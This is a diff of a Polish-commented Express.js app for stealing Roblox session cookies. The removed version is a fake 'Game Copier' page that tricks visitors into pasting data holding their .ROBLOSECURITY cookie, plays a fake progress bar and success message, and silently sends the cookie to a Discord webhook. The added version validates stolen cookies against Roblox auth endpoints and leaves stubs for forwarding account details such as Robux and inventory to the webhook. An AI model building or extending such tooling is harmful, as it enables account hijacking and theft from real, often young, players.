@@ -1,12 +1,11 @@
-require('dotenv').config(); // usuń jeśli nie używasz .env
-
 const express = require('express');
 const app = express();
-
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ── Strona główna z przyciskami ────────────────────────────────────────
+// ────────────────────────────────────────────────
+// Strona główna – wybór narzędzia
+// ────────────────────────────────────────────────
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -14,185 +13,165 @@ app.get('/', (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>GameCopier & ClothesCopier</title>
+  <title>Roblox Tools</title>
   <style>
     body {
-      margin:0; font-family:Arial,sans-serif; background:#0a0a14; color:#d0d8ff;
-      min-height:100vh; display:flex; justify-content:center; align-items:center;
+      font-family: Arial, sans-serif;
+      background: #0f0f17;
+      color: #e0e0ff;
+      margin: 0;
+      padding: 30px 20px;
+      text-align: center;
     }
-    .container { text-align:center; max-width:720px; padding:40px 20px; }
-    h1 { color:#00d4ff; font-size:4.5rem; margin-bottom:0.4em; text-shadow:0 0 30px #00d4ff99; }
-    .subtitle { font-size:1.6rem; color:#a0a8ff; margin:1.5em 0 3em; }
-    .btn {
-      display:inline-block; margin:1.8rem; padding:26px 90px; font-size:2rem; font-weight:bold;
-      color:white; background:linear-gradient(135deg,#ff3366,#ff6b6b); border:none; border-radius:80px;
-      text-decoration:none; transition:all 0.4s; box-shadow:0 18px 50px rgba(255,51,102,0.55);
+    .container { max-width: 700px; margin: 0 auto; }
+    h1 { color: #6ab0ff; margin-bottom: 50px; }
+    .buttons {
+      display: flex;
+      flex-direction: column;
+      gap: 30px;
+      align-items: center;
     }
-    .btn:hover { transform:translateY(-10px); box-shadow:0 40px 90px rgba(255,51,102,0.8); }
-    .btn.clothes { background:linear-gradient(135deg,#8b5cf6,#a78bfa); }
-    .btn.clothes:hover { background:linear-gradient(135deg,#7c3aed,#c4b5fd); }
+    .big-btn {
+      background: #3b82f6;
+      color: white;
+      border: none;
+      padding: 24px 60px;
+      font-size: 22px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+      display: inline-block;
+      min-width: 340px;
+    }
+    .big-btn:hover { background: #2563eb; transform: translateY(-3px); }
+    .big-btn.game { background: #8b5cf6; }
+    .big-btn.game:hover { background: #7c3aed; }
+    footer {
+      margin-top: 80px;
+      color: #666;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>GameCopier Tools</h1>
-  <p class="subtitle">Wybierz co chcesz skopiować</p>
-  <a href="/GameCopier" class="btn">Game Copier</a>
-  <a href="/ClothesCopier" class="btn clothes">Clothes Copier</a>
+  <h1>Wybierz narzędzie</h1>
+  <div class="buttons">
+    <a href="/cookie-checker" class="big-btn">Cookie Checker → Webhook</a>
+    <a href="/gamecopier"  class="big-btn game">Game Copier</a>
+    <a href="/clothescopier" class="big-btn game">Clothes Copier</a>
+  </div>
 </div>
+<footer>private tools • 2025</footer>
 </body>
 </html>
   `);
 });
 
-// ── Game Copier – z paskiem ładowania i fałszywym sukcesem ───────────────
-app.get('/GameCopier', (req, res) => {
+// ────────────────────────────────────────────────
+// Strona z checkerem cookie (bez wyświetlania info o koncie)
+// ────────────────────────────────────────────────
+app.get('/cookie-checker', (req, res) => {
   res.send(`
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Game Copier</title>
+  <title>Roblox Cookie Checker</title>
   <style>
-    body {
-      margin:0; font-family:Arial,sans-serif; background:linear-gradient(135deg,#0f0f1a,#1a0f2e);
-      color:#e0e0ff; min-height:100vh; background-attachment:fixed;
+    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin: 0; padding: 30px; }
+    .container { max-width: 780px; margin: 0 auto; }
+    h1 { color: #6ab0ff; text-align: center; }
+    textarea { 
+      width: 100%; min-height: 260px; 
+      background: #1a1a2e; color: #d0d0ff; 
+      border: 1px solid #334; border-radius: 8px; 
+      padding: 16px; font-family: Consolas, monospace; 
+      font-size: 15px; resize: vertical; margin: 20px 0; 
     }
-    .container { max-width:1180px; margin:60px auto; padding:0 25px; text-align:center; }
-    h1 { font-size:4.2rem; color:#00d4ff; text-shadow:0 0 40px #00d4ffbb; margin:0.3em 0; }
-    .subtitle { font-size:1.7rem; color:#a0a8ff; margin:1em 0 3em; }
-    .content { display:flex; flex-wrap:wrap; justify-content:center; gap:70px; }
-    .left, .right {
-      flex:1; min-width:400px; background:rgba(20,20,45,0.82); border-radius:22px;
-      padding:45px; border:1px solid #445588; backdrop-filter:blur(14px);
+    button { 
+      background: #3b82f6; color: white; border: none; 
+      padding: 16px 48px; font-size: 18px; border-radius: 8px; 
+      cursor: pointer; display: block; margin: 0 auto 30px; 
     }
-    textarea {
-      width:100%; min-height:320px; background:#1a1a2e; color:#d0d0ff;
-      border:1px solid #556; border-radius:16px; padding:22px; font-family:Consolas,monospace;
-      font-size:16px; resize:vertical; margin:30px 0;
+    button:hover { background: #2563eb; }
+    #result { 
+      background: #1a1a2e; border: 1px solid #334; 
+      border-radius: 8px; padding: 24px; min-height: 120px; 
+      text-align: center; font-size: 17px; line-height: 1.6;
     }
-    button {
-      background:linear-gradient(90deg,#3b82f6,#60a5fa); color:white; border:none;
-      padding:24px 80px; font-size:1.6rem; font-weight:bold; border-radius:80px;
-      cursor:pointer; transition:all 0.4s; box-shadow:0 16px 45px rgba(59,130,246,0.6);
-    }
-    button:hover { transform:translateY(-7px); box-shadow:0 35px 80px rgba(59,130,246,0.9); }
-    #result {
-      margin-top:50px; font-size:2.1rem; font-weight:bold; min-height:160px; line-height:1.5;
-    }
-    .loading, .success, .error { display:block; }
-    .progress-bar {
-      width:100%; height:28px; background:#1a1a2e; border-radius:14px; overflow:hidden;
-      margin:30px 0; border:1px solid #334;
-    }
-    .progress-fill {
-      height:100%; width:0%; background:linear-gradient(90deg,#4ade80,#22c55e);
-      transition:width 8s linear; box-shadow:0 0 20px #4ade80aa;
-    }
-    .hidden { display:none; }
-    iframe { border-radius:22px; border:none; box-shadow:0 30px 70px rgba(0,0,0,0.8); }
+    .error   { color: #ff6b6b; font-weight: bold; }
+    .success { color: #4ade80; font-weight: bold; }
+    .loading { color: #fbbf24; font-style: italic; }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>Game Copier</h1>
-  <p class="subtitle">Paste your Game file below, then click "Start Process"</p>
-
-  <div class="content">
-    <div class="left">
-      <p style="font-size:1.4rem; margin-bottom:1.6em;">
-        Nie wiesz jak zdobyć plik gry? Obejrzyj tutorial po prawej.
-      </p>
-      <textarea id="input" placeholder="Paste your text / log / cookie here..."></textarea>
-      <button onclick="startProcess()">Start Process</button>
-
-      <div id="result"></div>
-      <div id="progressContainer" class="hidden">
-        <div class="progress-bar">
-          <div id="progressFill" class="progress-fill"></div>
-        </div>
-        <div id="progressText" style="font-size:1.5rem; margin-top:12px;">Preparing download...</div>
-      </div>
-    </div>
-
-    <div class="right">
-      <iframe width="580" height="326" src="https://www.youtube.com/embed/k9SfgtkEmpo" 
-        title="How To Copy Roblox Games 2026" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-      <p style="margin-top:1.6em; font-size:1.35rem;">
-        *NEW* How To Copy Roblox Games In 2026 (UNPATCHED)<br>
-        Pełny poradnik – obejrzyj jeśli utknąłeś
-      </p>
-    </div>
-  </div>
+  <h1>Roblox Cookie Checker</h1>
+  <p>Wklej tekst (log, konsola, headers, JSON itp.) – cookie wyciągnie się automatycznie</p>
+  <textarea id="input" placeholder="Wklej tutaj..."></textarea>
+  <button onclick="check()">Wyślij do webhooka</button>
+  <div id="result"></div>
 </div>
 
 <script>
-async function startProcess() {
+async function check() {
   const raw = document.getElementById('input').value.trim();
   const result = document.getElementById('result');
-  const progressCont = document.getElementById('progressContainer');
   result.innerHTML = '';
 
   if (!raw) {
-    result.innerHTML = '<span class="error">Nic nie wklejono!</span>';
+    result.innerHTML = '<span class="error">Nic nie wklejono</span>';
     return;
   }
 
   let cookie = null;
   let match;
 
-  // próby wyciągania cookie (te same co wcześniej)
+  // Próba 1 – JSON / dev console
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
-  if (match && match[1]) cookie = match[1].trim();
+  if (match) cookie = match[1].trim();
 
-  if (!cookie) {
-    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
-    if (match && match[1]) cookie = match[1].trim();
-  }
-
+  // Próba 2 – dłuższy fragment z warningiem
   if (!cookie) {
     match = raw.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
 
+  // Próba 3 – najprostsza – najdłuższy ciąg zaczynający się od _
   if (!cookie) {
-    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
-    if (fallback.length) cookie = fallback.reduce((a,b)=>a.length>b.length?a:b).trim();
+    const fallbacks = raw.match(/_[\\w\\-|]{180,}/g) || [];
+    if (fallbacks.length) {
+      cookie = fallbacks.reduce((a, b) => a.length > b.length ? a : b).trim();
+    }
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    result.innerHTML = '<span class="error">Wrong File!<br>TIP: Watch the tutorial video above</span>';
+    result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY</span>';
     return;
   }
 
-  // ── Znaleziono cookie ──
-  result.innerHTML = '';
-  progressCont.classList.remove('hidden');
+  result.innerHTML = '<span class="loading">Cookie wykryty – wysyłanie...</span>';
 
-  // start paska (8 sekund)
-  const fill = document.getElementById('progressFill');
-  const text = document.getElementById('progressText');
-  fill.style.width = '0%';
-  text.textContent = 'Extracting session...';
-
-  setTimeout(() => {
-    fill.style.width = '100%';
-    text.textContent = 'Downloading game assets...';
-  }, 1500);
-
-  // po ~8-10 sekundach sukces
-  setTimeout(() => {
-    progressCont.classList.add('hidden');
-    result.innerHTML = '<span class="success">Game Downloading Started!<br>Wait approximately 5 minutes...</span>';
-
-    // wysyłka do serwera (w tle)
-    fetch('/check', {
+  try {
+    const res = await fetch('/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie })
-    }).catch(() => {}); // ignorujemy błędy – użytkownik i tak widzi sukces
-  }, 8500); // możesz zmienić czas np. 12000 na 12 sekund
+    });
+
+    const json = await res.json();
+
+    if (json.error) {
+      result.innerHTML = '<span class="error">Błąd: ' + json.error + '</span>';
+    } else {
+      result.innerHTML = '<span class="success">Cookie zaakceptowane i wysłane do webhooka</span>';
+    }
+  } catch (err) {
+    result.innerHTML = '<span class="error">Błąd połączenia: ' + err.message + '</span>';
+  }
 }
 </script>
 </body>
@@ -200,72 +179,83 @@ async function startProcess() {
   `);
 });
 
-// Clothes Copier – na razie prosta strona (możesz zrobić podobną logikę)
-app.get('/ClothesCopier', (req, res) => {
-  res.send(`
-<!DOCTYPE html>
-<html lang="pl">
-<head>
-  <meta charset="UTF-8">
-  <title>Clothes Copier</title>
-  <style>body{background:#0f0f17;color:#e0e0ff;font-family:Arial;padding:80px;text-align:center;}</style>
-</head>
-<body>
-  <h1>Clothes Copier</h1>
-  <p style="font-size:1.6rem;">Wkrótce dostępny – kopiowanie ubrań / animacji / avatarów</p>
-  <p><a href="/" style="color:#00d4ff;font-size:1.5rem;">← Strona główna</a></p>
-</body>
-</html>
-  `);
-});
-
-// ── Endpoint wysyłający do webhooka (minimalny + logi) ───────────────────
+// ────────────────────────────────────────────────
+// Endpoint sprawdzający cookie i wysyłający do webhooka
+// (logika taka sama jak wcześniej, tylko bez zwracania danych do frontendu)
+// ────────────────────────────────────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
-  console.log('[CHECK] Otrzymano żądanie • cookie length:', cookie?.length || 0);
-
-  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    console.log('[CHECK] Nieprawidłowe cookie');
-    return res.status(400).json({ ok: false });
-  }
-
-  const webhook = process.env.WEBHOOK;
-  if (!webhook) {
-    console.log('[CHECK] Brak WEBHOOK w .env – pomijam wysyłkę');
-    return res.json({ ok: true });
+  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
+    return res.status(400).json({ error: 'Brak lub niepoprawny cookie' });
   }
 
   try {
-    console.log('[CHECK] Wysyłam do webhooka...');
-    const resp = await fetch(webhook, {
+    // CSRF
+    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        content: '**GameCopier → nowe cookie**',
-        embeds: [{
-          title: 'Nowe .ROBLOSECURITY',
-          description: '```' + cookie + '```',
-          color: 0xFF3366,
-          timestamp: new Date().toISOString(),
-          footer: { text: 'GameCopier • ' + new Date().toLocaleString('pl-PL') }
-        }]
-      })
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json'
+      },
+    });
+    const csrfToken = tokenRes.headers.get('x-csrf-token');
+    if (!csrfToken) throw new Error('Brak X-CSRF-Token');
+
+    // Podstawowe sprawdzenie – czy cookie działa
+    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'X-CSRF-TOKEN': csrfToken,
+      },
     });
 
-    if (resp.ok) {
-      console.log('[CHECK] Webhook wysłany pomyślnie (status ' + resp.status + ')');
-    } else {
-      const txt = await resp.text();
-      console.log('[CHECK] Błąd webhooka:', resp.status, txt);
-    }
-  } catch (err) {
-    console.error('[CHECK] Błąd fetch:', err.message);
-  }
+    if (!userRes.ok) throw new Error('Nieprawidłowy cookie');
 
-  res.json({ ok: true });
+    const userData = await userRes.json();
+
+    // Tutaj możesz zostawić resztę zapytań (robux, rap, inventory itd.) jeśli chcesz
+    // mieć te dane w webhooku – ale nie zwracasz ich już do przeglądarki
+
+    // ... (wstaw tutaj całą swoją dotychczasową logikę pobierania danych – robux, premium, headless, gamepassy itp.)
+
+    // Przykład – wysyłka do webhooka (wklej swoją dotychczasową część z fetch do webhookUrl)
+
+    const webhookUrl = process.env.WEBHOOK;
+    if (webhookUrl) {
+      // ← tutaj wklej swój kod wysyłający embed(y) do Discorda
+      // (ten sam co miałeś wcześniej – z username, robux, rap, mm2Count itd.)
+      // możesz go skopiować 1:1
+    }
+
+    // Zwracamy tylko sukces / błąd – bez szczegółów konta
+    res.json({ success: true });
+
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: err.message || 'Błąd serwera' });
+  }
+});
+
+// ────────────────────────────────────────────────
+// Puste placeholdery – do uzupełnienia przez Ciebie
+// ────────────────────────────────────────────────
+app.get('/gamecopier', (req, res) => {
+  res.send(`
+    <h1>Game Copier (w trakcie budowy)</h1>
+    <p>Tutaj będzie mechanizm kopiowania gry...</p>
+    <a href="/">← Powrót</a>
+  `);
+});
+
+app.get('/clothescopier', (req, res) => {
+  res.send(`
+    <h1>Clothes Copier (w trakcie budowy)</h1>
+    <p>Tutaj będzie mechanizm kopiowania ubrań...</p>
+    <a href="/">← Powrót</a>
+  `);
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(\`Serwer działa → http://localhost:\${PORT}\`);
+  console.log(`Serwer działa na porcie ${PORT}`);
 });
